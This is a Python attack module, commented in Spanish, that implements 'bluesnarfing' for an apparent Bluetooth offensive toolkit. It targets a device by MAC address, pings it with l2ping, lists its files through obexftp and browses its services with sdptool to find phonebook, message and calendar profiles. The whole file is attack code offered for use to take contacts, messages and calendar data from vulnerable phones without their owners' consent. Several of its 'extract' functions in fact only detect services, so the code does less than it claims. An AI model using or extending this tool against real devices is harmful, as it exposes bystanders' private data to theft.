"""
Bluesnarfing - Extracción no autorizada de datos vía OBEX.
Funciona con Bluetooth interno en dispositivos vulnerables (antiguos/sin parches).
"""

import subprocess
from typing import Optional

from bluesky.core.engine import BaseModule


class Bluesnarfing(BaseModule):
    """Bluesnarfing - Intenta extraer datos (contactos, mensajes) de dispositivos Bluetooth."""

    name = "bluesnarfing"
    description = "Bluesnarfing: Extrae información (contactos, mensajes, calendario) de dispositivos Bluetooth vulnerables vía OBEX"
    author = "Bluesky Project"
    version = "0.1.0"
    cve = ""
    requires_hardware = []
    requires_root = False
    target_type = "classic"
    severity = "high"

    def run(self):
        """Ejecuta el ataque Bluesnarfing."""
        target = self.target
        data_type = self.options.get("type", "contacts")  # contacts | messages | calendar | all

        if not target:
            self.result["error"] = "Se requiere una dirección MAC de target"
            self.result["data"]["help"] = "Uso: bluesky attack bluesnarfing <MAC> [--options '{\"type\":\"contacts\"}']"
            return self.result

        self.result["data"]["target"] = target
        self.result["data"]["data_type"] = data_type

        # Verificar conectividad
        if not self._ping_device(target):
            self.result["error"] = f"No se puede alcanzar el dispositivo {target}"
            return self.result

        try:
            if data_type == "contacts" or data_type == "all":
                contacts = self._extract_contacts(target)
                if contacts:
                    self.result["data"]["contacts"] = contacts

            if data_type == "messages" or data_type == "all":
                messages = self._extract_messages(target)
                if messages:
                    self.result["data"]["messages"] = messages

            if data_type == "calendar" or data_type == "all":
                calendar = self._extract_calendar(target)
                if calendar:
                    self.result["data"]["calendar"] = calendar

            if self.result["data"].get("contacts") or self.result["data"].get("messages") or self.result["data"].get("calendar"):
                self.result["success"] = True
            else:
                self.result["success"] = False
                self.result["error"] = "No se pudieron extraer datos. El dispositivo puede estar protegido."

        except Exception as e:
            self.result["error"] = str(e)
            self.result["success"] = False

        return self.result

    def _ping_device(self, mac: str) -> bool:
        """Verifica si el dispositivo está al alcance."""
        try:
            result = subprocess.run(
                ["l2ping", "-c", "1", "-t", "2", mac],
                capture_output=True, text=True, timeout=5
            )
            return result.returncode == 0
        except (FileNotFoundError, subprocess.TimeoutExpired):
            return False

    def _extract_contacts(self, mac: str) -> list:
        """Intenta extraer contactos vía PBAP (Phone Book Access Profile)."""
        contacts = []
        try:
            # Usar obexftp para intentar conexión OBEX
            result = subprocess.run(
                ["obexftp", "-b", mac, "-l"],
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0 and result.stdout.strip():
                contacts.append({
                    "source": "obexftp",
                    "data": result.stdout.strip()
                })

            # Intentar conectar al canal PBAP (UUID 0x1130)
            result = subprocess.run(
                ["sdptool", "browse", "--tree", mac],
                capture_output=True, text=True, timeout=10
            )
            if "PBAP" in result.stdout or "Phonebook" in result.stdout:
                contacts.append({
                    "source": "sdptool",
                    "note": "PBAP Service detected - device may share contacts",
                    "data": self._parse_sdp_services(result.stdout)
                })

        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        return contacts

    def _extract_messages(self, mac: str) -> list:
        """Intenta acceder a mensajes vía MAP (Message Access Profile)."""
        messages = []
        try:
            result = subprocess.run(
                ["sdptool", "browse", mac],
                capture_output=True, text=True, timeout=10
            )
            if "MAP" in result.stdout or "Message" in result.stdout:
                messages.append({
                    "source": "sdptool",
                    "note": "MAP Service detected - device may share messages",
                    "channels": self._parse_rfcomm_channels(result.stdout)
                })
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return messages

    def _extract_calendar(self, mac: str) -> list:
        """Intenta acceder al calendario."""
        calendar = []
        try:
            result = subprocess.run(
                ["sdptool", "browse", mac],
                capture_output=True, text=True, timeout=10
            )
            if "Calendar" in result.stdout or "CSP" in result.stdout:
                calendar.append({
                    "source": "sdptool",
                    "note": "Calendar service detected"
                })
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass
        return calendar

    def _parse_sdp_services(self, sdp_output: str) -> dict:
        """Parsea la salida de sdptool para extraer servicios."""
        services = {}
        current_service = None
        for line in sdp_output.split("\n"):
            if "Service Name" in line:
                current_service = line.split(":")[-1].strip()
            elif "Service RecHandle" in line and current_service:
                services[current_service] = line.split(":")[-1].strip()
        return services

    def _parse_rfcomm_channels(self, sdp_output: str) -> list:
        """Extrae canales RFCOMM de la salida de sdptool."""
        channels = []
        import re
        for match in re.finditer(r'Channel\s*:\s*(\d+)', sdp_output):
            channels.append(int(match.group(1)))
        return channels
